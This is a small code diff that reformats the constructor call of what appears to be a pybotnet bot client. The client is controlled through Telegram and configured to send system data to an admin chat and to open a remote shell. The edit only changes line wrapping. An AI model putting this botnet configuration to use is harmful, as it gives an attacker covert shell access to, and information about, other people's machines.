@@ -10,8 +10,9 @@ ADMIN_CHAT_ID = '1947234025'
 # * show_log: just for debugging
 # * send_system_data: send system short info in bot messages
 
-bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
-                        show_log=True, send_system_data=True, is_shell=True)
+bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,show_log=True,
+                         send_system_data=True, is_shell=True)
+
 
 
 while 1:
